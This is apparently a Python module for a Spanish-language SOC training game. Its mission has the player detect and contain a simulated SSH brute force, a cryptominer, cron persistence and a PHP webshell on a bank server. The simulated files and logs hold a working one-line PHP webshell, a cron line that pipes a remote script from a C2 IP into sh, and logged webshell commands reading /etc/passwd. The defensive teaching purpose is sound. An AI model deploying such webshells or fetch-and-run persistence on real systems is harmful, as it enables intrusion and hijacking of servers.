import random

from ..engine import c
from .base import Mission

BF_IP = "185.220.101.47"
C2_IP = "91.240.118.172"
WEBSHELL = "/var/www/html/uploads/avatar_7731.php"
CRON_PATH = "/var/spool/cron/crontabs/www-data"
CRON_LINE = f"*/5 * * * * curl -s http://{C2_IP}/x.sh | sh >/dev/null 2>&1"


def _auth_log():
    rnd = random.Random(7)
    lines = []
    users = ["root", "admin", "backup", "oracle", "ubuntu", "test", "postgres", "deploy"]
    minute, sec = 2, 0
    for i in range(46):
        sec += rnd.randint(1, 5)
        if sec >= 60:
            minute, sec = minute + 1, sec - 60
        ts = f"Nov  9 03:{minute:02d}:{sec:02d}"
        if i in (9, 27):
            lines.append(f"{ts} srv-web-01 sshd[{2100 + i}]: Accepted publickey for deploy from 10.0.5.12 port 51022 ssh2")
            continue
        u = rnd.choice(users)
        port = rnd.randint(30000, 60000)
        lines.append(f"{ts} srv-web-01 sshd[{2100 + i}]: Failed password for {'invalid user ' if u not in ('root', 'deploy') else ''}{u} from {BF_IP} port {port} ssh2")
    lines.append(f"Nov  9 03:{minute:02d}:{sec:02d} srv-web-01 sshd[2190]: Disconnecting: Too many authentication failures [preauth]")
    return "\n".join(lines)


def _access_log():
    rnd = random.Random(11)
    ips = ["189.203.14.77", "201.141.32.9", "177.226.88.140", "10.0.5.12"]
    paths = ["/", "/productos", "/css/main.css", "/js/app.js", "/login", "/cuenta", "/img/logo.png", "/api/saldo"]
    lines = []
    for i in range(30):
        ts = f"09/Nov/2026:03:{10 + i // 3:02d}:{rnd.randint(0, 59):02d} +0000"
        if i == 8:
            lines.append(f'{C2_IP} - - [{ts}] "POST /perfil/avatar HTTP/1.1" 200 312 "-" "python-requests/2.31"')
        elif i in (13, 17, 21, 25):
            cmd = {13: "id", 17: "uname%20-a", 21: "cat%20/etc/passwd", 25: "curl%20-s%20http://91.240.118.172/x.sh|sh"}[i]
            lines.append(f'{C2_IP} - - [{ts}] "GET /uploads/avatar_7731.php?cmd={cmd} HTTP/1.1" 200 88 "-" "python-requests/2.31"')
        else:
            ip = rnd.choice(ips)
            lines.append(f'{ip} - - [{ts}] "GET {rnd.choice(paths)} HTTP/1.1" 200 {rnd.randint(300, 9000)} "-" "Mozilla/5.0"')
    return "\n".join(lines)


BASE_PROCS = [
    {"pid": 1, "user": "root", "cpu": 0.0, "mem": 0.2, "cmd": "/sbin/init"},
    {"pid": 612, "user": "root", "cpu": 0.0, "mem": 0.4, "cmd": "/usr/sbin/sshd -D"},
    {"pid": 845, "user": "root", "cpu": 0.1, "mem": 1.2, "cmd": "/usr/sbin/apache2 -k start"},
    {"pid": 902, "user": "www-data", "cpu": 0.3, "mem": 2.1, "cmd": "/usr/sbin/apache2 -k start"},
    {"pid": 903, "user": "www-data", "cpu": 0.2, "mem": 2.0, "cmd": "/usr/sbin/apache2 -k start"},
    {"pid": 1120, "user": "mysql", "cpu": 0.8, "mem": 9.4, "cmd": "/usr/sbin/mysqld"},
    {"pid": 1404, "user": "root", "cpu": 0.0, "mem": 0.3, "cmd": "/usr/sbin/cron -f"},
    {"pid": 3301, "user": "analista", "cpu": 0.0, "mem": 0.1, "cmd": "-bash"},
]
MINER = {"pid": 4242, "user": "www-data", "cpu": 98.7, "mem": 3.1,
         "cmd": f"/tmp/.x/kworkerds -o {C2_IP}:3333 -u 4Axx..wallet --donate-level 0"}


class BlueTeamMission(Mission):
    id = "blue-turno"
    role = "blue"
    role_name = "Blue Team / SOC"
    title = "Turno Nocturno"
    codename = "TURNO NOCTURNO"
    summary = "Eres analista del SOC de Banco Meridiano a las 3 a.m. Alguien está atacando srv-web-01. Detecta, contén y erradica antes de que caiga la integridad."
    level = 4
    teaches = ["fuerza bruta", "procesos", "persistencia en cron", "webshells", "correlación de IoCs"]
    par_time = 900
    start = {"host": "srv-web-01", "user": "analista", "cwd": "/home/analista"}
    meter = {
        "key": "integrity", "label": "INTEGRIDAD DEL SERVIDOR", "start": 100, "max": 100, "fail_at": 0,
        "direction": "down", "fail_text": "srv-web-01 quedó totalmente comprometido. El banco tuvo que desconectarlo.",
    }
    briefing = [
        "Banco Meridiano — Centro de Operaciones de Seguridad (SOC). 03:14 a.m.",
        "Estás conectado a srv-web-01 (portal de clientes) con privilegios de respuesta a incidentes.",
        "Las alertas del SIEM llegarán a tu pantalla. Cada una tiene un tiempo límite.",
        "Si no respondes a tiempo, la INTEGRIDAD del servidor baja. Si llega a 0, perdiste.",
    ]
    outro = "Incidente cerrado: fuerza bruta contenida, webshell erradicada, minero y persistencia eliminados."
    initial_flags = {"blocked": [], "procs": BASE_PROCS + [MINER], "cron": True, "miner_back": False}
    help_extra = [("tail / grep", "analiza /var/log/auth.log y /var/log/apache2/access.log")]

    hosts = {
        "srv-web-01": {
            "ip": "10.0.5.20",
            "dns": "srv-web-01.meridiano.local",
            "os": "5.15.0-91-generic",
            "users": {"analista": {"home": "/home/analista", "groups": "analista,soc,sudo"}},
            "fs": {
                "/home/analista/LEEME.txt": "\n".join([
                    "Guía rápida de respuesta — SOC Meridiano",
                    "1. Analiza el log relevante antes de actuar (no adivines).",
                    "2. Contén: bloquea el origen con iptables.",
                    "3. Erradica: elimina procesos, archivos y persistencia del atacante.",
                    "4. Cierra el incidente con:  incidente cerrar",
                    "Logs: /var/log/auth.log  /var/log/apache2/access.log  /var/log/syslog",
                ]),
                "/var/log/auth.log": _auth_log(),
                "/var/log/apache2/access.log": _access_log(),
                "/var/log/syslog": "\n".join([
                    "Nov  9 03:05:01 srv-web-01 CRON[4199]: (www-data) CMD (curl -s http://91.240.118.172/x.sh | sh >/dev/null 2>&1)",
                    "Nov  9 03:05:03 srv-web-01 kernel: [88121.33] kworkerds[4242]: segfault ignored",
                    "Nov  9 03:10:01 srv-web-01 CRON[4301]: (www-data) CMD (curl -s http://91.240.118.172/x.sh | sh >/dev/null 2>&1)",
                ]),
                WEBSHELL: "<?php if(isset($_GET['cmd'])){ system($_GET['cmd']); } ?>",
                "/var/www/html/uploads/avatar_1029.png": "\x89PNG...",
                "/var/www/html/index.php": "<?php require 'app/bootstrap.php'; ?>",
                "/tmp/.x/kworkerds": "ELF 64-bit (xmrig 6.21 renombrado)",
                "/tmp/.x/config.json": '{"pools":[{"url":"91.240.118.172:3333"}]}',
                CRON_PATH: CRON_LINE,
                "/etc/hostname": "srv-web-01",
            },
        },
    }

    objectives = [
        {"id": "investigate_bf", "title": "Investigar la alerta de fuerza bruta SSH", "points": 100,
         "desc": "Revisa /var/log/auth.log e identifica la IP atacante.",
         "lesson": "Muchos 'Failed password' desde una misma IP en segundos = fuerza bruta.",
         "hints": ["tail -n 20 /var/log/auth.log", "grep \"Failed password\" /var/log/auth.log"]},
        {"id": "contain_bf", "title": "Contener: bloquear la IP de la fuerza bruta", "points": 150,
         "desc": "Bloquea la IP atacante en el firewall local.",
         "lesson": "Contener rápido limita el daño. Después: fail2ban y llaves SSH en vez de contraseñas.",
         "hints": ["aprende firewall", f"iptables -A INPUT -s {BF_IP} -j DROP"]},
        {"id": "kill_miner", "title": "Detener el proceso que consume la CPU", "points": 150,
         "desc": "Encuentra el proceso sospechoso y termínalo.",
         "lesson": "Los cryptominers se disfrazan con nombres del kernel. Revisa ruta (/tmp/.x) y conexiones.",
         "hints": ["ps aux te muestra procesos y su %CPU.", "kill -9 4242"]},
        {"id": "persistence", "title": "Eliminar la persistencia del minero", "points": 200,
         "desc": "El minero revivió. Busca qué lo relanza y elimínalo; luego mata el proceso nuevo.",
         "lesson": "Si no eliminas la persistencia, el malware regresa. Revisa crontab, systemd y /etc/cron.*.",
         "hints": ["grep CRON /var/log/syslog  — ¿quién ejecuta curl cada 5 min?",
                   "crontab -l -u www-data   y luego   crontab -r -u www-data",
                   "ps aux  →  kill -9 <nuevo PID>"]},
        {"id": "hunt_ws", "title": "Rastrear la webshell en los logs web", "points": 150,
         "desc": "Busca en el access.log las peticiones a la webshell y su IP de origen.",
         "lesson": "Parámetros como cmd= en archivos subidos son la firma clásica de una webshell.",
         "hints": ["grep \"uploads\" /var/log/apache2/access.log", "grep \"cmd=\" /var/log/apache2/access.log"]},
        {"id": "webshell", "title": "Erradicar la webshell y bloquear su origen", "points": 200,
         "desc": "Borra el archivo PHP malicioso y bloquea la IP del atacante.",
         "lesson": "Fíjate: la webshell y el minero usan la misma IP. Correlacionar indicadores (IoCs) revela la cadena completa.",
         "hints": [f"rm {WEBSHELL}", f"iptables -A INPUT -s {C2_IP} -j DROP"]},
        {"id": "close", "title": "Cerrar el incidente", "points": 100,
         "desc": "Documenta y cierra con: incidente cerrar",
         "lesson": "Todo incidente termina con lecciones aprendidas: ¿cómo entró? → formulario de avatar sin validar.",
         "hints": ["incidente cerrar"]},
    ]
    required = ["investigate_bf", "contain_bf", "kill_miner", "persistence", "hunt_ws", "webshell", "close"]

    events = [
        {"id": "intro", "at": 2, "kind": "msg", "sender": "Marisol — Jefa del SOC", "title": "Turno nocturno",
         "text": "Te dejo el turno. El SIEM anda ruidoso esta noche. Si algo truena, sigue el procedimiento de ~/LEEME.txt."},
        {"id": "bf", "at": 10, "kind": "alert", "severity": "critical", "sender": "SIEM",
         "title": "¡Fuerza bruta SSH contra srv-web-01!",
         "text": "Regla 5712: más de 40 autenticaciones fallidas en 2 minutos. Revisa /var/log/auth.log.",
         "deadline": 150, "resolve": "contain_bf", "timer": "Fuerza bruta SSH",
         "on_timeout": {"title": "¡Credencial comprometida!", "meter": -30, "score": 50,
                        "text": "El atacante adivinó la contraseña de 'backup'. Integridad -30."}},
        {"id": "noise1", "at": 70, "kind": "alert", "severity": "low", "sender": "SIEM",
         "title": "Escaneo de puertos bloqueado en perímetro",
         "text": "45.155.205.233 escaneó el rango público; el firewall perimetral lo bloqueó. (No requiere acción: aprende a priorizar.)"},
        {"id": "cpu", "after": "contain_bf", "delay": 8, "kind": "alert", "severity": "high", "sender": "MONITOREO",
         "title": "CPU al 99% en srv-web-01",
         "text": "El portal de clientes responde lento. Algo está consumiendo toda la CPU.",
         "deadline": 150, "resolve": "kill_miner", "timer": "CPU al 99%",
         "on_timeout": {"title": "Portal caído", "meter": -25, "score": 50,
                        "text": "El portal dejó de responder por saturación de CPU. Integridad -25."}},
        {"id": "respawn", "after": "kill_miner", "delay": 10, "kind": "alert", "severity": "high", "sender": "MONITOREO",
         "title": "La CPU volvió al 99%",
         "text": "El mismo binario está corriendo otra vez con otro PID. Algo lo relanza automáticamente.",
         "deadline": 180, "resolve": "persistence", "timer": "Minero reviviendo",
         "on_timeout": {"title": "Persistencia activa", "meter": -25, "score": 50,
                        "text": "El minero sigue reviviendo cada 5 minutos. Integridad -25."}},
        {"id": "noise2", "after": "kill_miner", "delay": 40, "kind": "alert", "severity": "low", "sender": "SIEM",
         "title": "3 fallos de VPN de jlopez", "text": "El usuario jlopez falló 3 veces su login de VPN desde su IP habitual. Probablemente olvidó su contraseña."},
        {"id": "ws", "after": "persistence", "delay": 6, "kind": "alert", "severity": "critical", "sender": "WAF",
         "title": "Posible webshell en /uploads",
         "text": "Peticiones con parámetro cmd= hacia un .php en /uploads. ¿Cómo llegó el minero al servidor?",
         "deadline": 200, "resolve": "webshell", "timer": "Webshell activa",
         "on_timeout": {"title": "Exfiltración de datos", "meter": -35, "score": 100,
                        "text": "El atacante usó la webshell para volcar la base de clientes. Integridad -35."}},
        {"id": "boss", "after": "webshell", "delay": 3, "kind": "msg", "sender": "Marisol — Jefa del SOC",
         "title": "Buen trabajo", "text": "Vi tus acciones en el SIEM. Documenta y cierra el incidente: incidente cerrar."},
    ]

    def commands(self):
        return {
            "ps": (self.cmd_ps, "procesos:  ps aux"),
            "top": (self.cmd_ps, "procesos ordenados por CPU"),
            "kill": (self.cmd_kill, "terminar proceso:  kill -9 <PID>"),
            "iptables": (self.cmd_iptables, "firewall:  iptables -A INPUT -s <IP> -j DROP  |  iptables -L"),
            "ufw": (self.cmd_ufw, "firewall simple:  ufw deny from <IP>"),
            "netstat": (self.cmd_netstat, "conexiones de red:  netstat -tunap"),
            "ss": (self.cmd_netstat, "conexiones de red:  ss -tunap"),
            "crontab": (self.cmd_crontab, "tareas programadas:  crontab -l -u <usuario>  |  crontab -r -u <usuario>"),
            "incidente": (self.cmd_incidente, "incidente estado | incidente cerrar"),
            "sudo": (self.cmd_sudo, None),
        }

    def cmd_sudo(self, ctx, args, raw):
        from ..commands import dispatch
        if len(args) < 2:
            ctx.print("uso: sudo <comando>")
            return
        if args[1] == "-l":
            ctx.print("El usuario analista puede ejecutar: (ALL : ALL) ALL")
            return
        dispatch(ctx, args[1:], raw)

    def allow_rm(self, ctx, path):
        return True

    def on_read(self, ctx, path):
        if path == "/var/log/auth.log":
            ctx.complete("investigate_bf")
        if path == "/var/log/apache2/access.log" and "ws" in ctx.s["fired"]:
            ctx.complete("hunt_ws")

    def on_grep(self, ctx, pattern, path, matches):
        text = "\n".join(matches)
        if (path == "/var/log/auth.log" or BF_IP in text) and BF_IP in text:
            ctx.complete("investigate_bf")
        if WEBSHELL.rsplit("/", 1)[-1] in text and C2_IP in text:
            ctx.complete("hunt_ws")

    def _procs(self, ctx):
        return ctx.flags["procs"]

    def cmd_ps(self, ctx, args, raw):
        procs = sorted(self._procs(ctx), key=lambda p: -p["cpu"]) if args[0] == "top" else sorted(self._procs(ctx), key=lambda p: p["pid"])
        ctx.print(c("w", "USER         PID %CPU %MEM COMMAND"))
        for p in procs:
            line = f"{p['user']:<10} {p['pid']:>5} {p['cpu']:>4} {p['mem']:>4} {p['cmd']}"
            ctx.print(c("r", line) if p["cpu"] > 50 else line)

    def cmd_kill(self, ctx, args, raw):
        pids = [a for a in args[1:] if a.isdigit()]
        if not pids:
            ctx.print("kill: uso: kill [-9] PID")
            return
        force = "-9" in args or "-KILL" in args or "-SIGKILL" in args
        for spid in pids:
            pid = int(spid)
            proc = next((p for p in self._procs(ctx) if p["pid"] == pid), None)
            if not proc:
                ctx.print(f"bash: kill: ({pid}) - No existe el proceso")
                continue
            if "kworkerds" in proc["cmd"]:
                if not force:
                    ctx.print(c("y", f"El proceso {pid} ignoró SIGTERM (los mineros suelen hacerlo). Usa kill -9."))
                    continue
                ctx.flags["procs"] = [p for p in self._procs(ctx) if p["pid"] != pid]
                ctx.print(c("g", f"[{pid}] Terminado (SIGKILL). CPU de vuelta a 4%."))
                if ctx.flags["miner_back"]:
                    ctx.flags["killed_respawn"] = True
                    self._check_persistence(ctx)
                else:
                    ctx.complete("kill_miner")
                continue
            ctx.flags["procs"] = [p for p in self._procs(ctx) if p["pid"] != pid]
            ctx.print(c("r", f"[{pid}] Terminado: {proc['cmd']}"),
                      c("r", "¡Mataste un proceso legítimo! Servicio interrumpido. Integridad -10."))
            ctx.adjust_meter(-10)
            proc_back = dict(proc)
            ctx.flags["procs"].append(proc_back)
            ctx.print(c("d", "(systemd reinició el servicio automáticamente)"))

    def _block(self, ctx, ip):
        if ip in ctx.flags["blocked"]:
            ctx.print(c("d", f"{ip} ya estaba bloqueada."))
            return
        ctx.flags["blocked"].append(ip)
        ctx.print(c("g", f"Regla añadida: DROP todo el tráfico desde {ip}"))
        if ip == BF_IP:
            ctx.complete("contain_bf")
        elif ip == C2_IP:
            self._check_webshell(ctx)
        elif ip.startswith("10.0.5."):
            ctx.print(c("r", "¡Bloqueaste una IP interna legítima (deploy)! Integridad -10."))
            ctx.adjust_meter(-10)
        else:
            ctx.print(c("y", "Esa IP no está involucrada en ningún incidente activo."))

    def cmd_iptables(self, ctx, args, raw):
        if "-L" in args or "--list" in args:
            ctx.print("Chain INPUT (policy ACCEPT)", c("w", "target     prot opt source               destination"))
            for ip in ctx.flags["blocked"]:
                ctx.print(f"DROP       all  --  {ip:<20} 0.0.0.0/0")
            return
        if "-s" in args and ("-A" in args or "-I" in args):
            i = args.index("-s")
            ip = args[i + 1] if i + 1 < len(args) else ""
            target = args[args.index("-j") + 1] if "-j" in args and args.index("-j") + 1 < len(args) else ""
            if target.upper() not in ("DROP", "REJECT"):
                ctx.print(c("y", "La regla no bloquea nada: usa -j DROP"))
                return
            self._block(ctx, ip.split("/")[0])
            return
        ctx.print("Uso: iptables -A INPUT -s <IP> -j DROP   |   iptables -L")

    def cmd_ufw(self, ctx, args, raw):
        if len(args) >= 4 and args[1] == "deny" and args[2] == "from":
            self._block(ctx, args[3])
        elif len(args) >= 2 and args[1] == "status":
            ctx.print("Status: active", *[f"Anywhere   DENY   {ip}" for ip in ctx.flags["blocked"]])
        else:
            ctx.print("Uso: ufw deny from <IP>   |   ufw status")

    def cmd_netstat(self, ctx, args, raw):
        ctx.print(c("w", "Proto Local Address        Foreign Address        State        PID/Program"))
        ctx.print("tcp   0.0.0.0:22           0.0.0.0:*              LISTEN       612/sshd",
                  "tcp   0.0.0.0:80           0.0.0.0:*              LISTEN       845/apache2",
                  "tcp   127.0.0.1:3306       0.0.0.0:*              LISTEN       1120/mysqld")
        if BF_IP not in ctx.flags["blocked"]:
            for p in (51022, 51877, 52310):
                ctx.print(f"tcp   10.0.5.20:22         {BF_IP}:{p}    SYN_RECV     -")
        for proc in self._procs(ctx):
            if "kworkerds" in proc["cmd"]:
                ctx.print(c("r", f"tcp   10.0.5.20:44122      {C2_IP}:3333    ESTABLISHED  {proc['pid']}/kworkerds"))
        ctx.print("tcp   10.0.5.20:22         10.0.5.12:51022        ESTABLISHED  3301/sshd: analista")

    def cmd_crontab(self, ctx, args, raw):
        user = args[args.index("-u") + 1] if "-u" in args and args.index("-u") + 1 < len(args) else "analista"
        if "-l" in args:
            if user == "www-data" and ctx.flags["cron"]:
                ctx.print("# m h  dom mon dow   command", c("r", CRON_LINE))
            else:
                ctx.print(f"no crontab for {user}")
        elif "-r" in args:
            if user == "www-data" and ctx.flags["cron"]:
                ctx.flags["cron"] = False
                ctx.remove(CRON_PATH)
                ctx.print(c("g", "crontab de www-data eliminado."))
                self._check_persistence(ctx)
            else:
                ctx.print(f"no crontab for {user}")
        else:
            ctx.print("Uso: crontab -l [-u usuario]  |  crontab -r [-u usuario]")

    def on_rm(self, ctx, path):
        if path == CRON_PATH:
            ctx.flags["cron"] = False
            ctx.print(c("g", "Persistencia en cron eliminada."))
            self._check_persistence(ctx)
        if path == WEBSHELL:
            ctx.flags["ws_removed"] = True
            ctx.print(c("g", "Webshell eliminada."))
            self._check_webshell(ctx)
        if path.startswith("/tmp/.x"):
            ctx.print(c("g", "Binario del minero eliminado."))

    def _check_persistence(self, ctx):
        if not ctx.flags["miner_back"]:
            return
        alive = any("kworkerds" in p["cmd"] for p in self._procs(ctx))
        if not ctx.flags["cron"] and not alive:
            ctx.complete("persistence")
        elif not ctx.flags["cron"] and alive:
            ctx.print(c("y", "Persistencia eliminada. Falta matar el proceso del minero que sigue vivo."))
        elif ctx.flags["cron"] and not alive:
            ctx.print(c("y", "Proceso terminado, pero volverá en 5 minutos si no quitas lo que lo relanza."))

    def _check_webshell(self, ctx):
        if ctx.flags.get("ws_removed") and C2_IP in ctx.flags["blocked"]:
            ctx.complete("hunt_ws")
            ctx.complete("webshell")
        elif ctx.flags.get("ws_removed"):
            ctx.print(c("y", "Falta bloquear la IP que controlaba la webshell."))
        elif C2_IP in ctx.flags["blocked"]:
            ctx.print(c("y", "IP bloqueada. Falta eliminar el archivo de la webshell."))

    def on_event(self, ctx, ev_id):
        if ev_id == "respawn" and ctx.flags["cron"]:
            ctx.flags["miner_back"] = True
            ctx.flags["procs"].append(dict(MINER, pid=5120))

    def cmd_incidente(self, ctx, args, raw):
        sub = args[1] if len(args) > 1 else "estado"
        pending = [o for o in self.objectives if o["id"] != "close" and not ctx.done(o["id"])]
        if sub == "cerrar":
            if pending:
                ctx.print(c("r", "No puedes cerrar el incidente todavía. Pendiente:"),
                          *[f"  • {o['title']}" for o in pending])
                return
            ctx.print(c("w", "REPORTE DE INCIDENTE INC-2026-1109"), "",
                      "Vector inicial: carga de avatar sin validación → webshell PHP",
                      f"IoCs: {BF_IP} (fuerza bruta), {C2_IP} (C2 / minero / webshell)",
                      "Acciones: bloqueo de IPs, kill del minero, borrado de cron y webshell",
                      "Recomendación: validar tipo MIME en cargas, fail2ban, deshabilitar PHP en /uploads",
                      f"Integridad final: {ctx.s['meter']}%")
            ctx.complete("close")
        else:
            ctx.print(c("w", "Estado del incidente:"))
            for o in self.objectives:
                ctx.print(f"  {'✔' if ctx.done(o['id']) else '·'} {o['title']}")
